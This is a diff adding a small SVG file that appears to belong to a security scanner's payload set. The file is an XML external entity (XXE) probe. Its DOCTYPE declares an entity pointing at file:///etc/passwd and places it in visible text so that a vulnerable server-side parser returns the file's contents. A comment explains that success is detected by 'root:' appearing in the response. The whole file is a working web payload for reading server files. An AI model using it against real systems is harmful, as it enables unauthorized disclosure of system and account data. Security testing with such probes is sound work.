@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- XXE via a server-side XML/SVG parser that resolves external entities.
+     Targets the metadata/XML-parse stage (lxml etree) rather than the
+     rasterizer. The entity is referenced in visible <text>, so a pipeline
+     that flattens SVG text (or returns parsed text) REFLECTS /etc/passwd.
+     No {{COLLAB}} token; this is an in-band file-read probe, correlated by
+     the presence of "root:" in the response, not by an OOB hit. -->
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">
+  <text x="0" y="20">&xxe;</text>
+</svg>
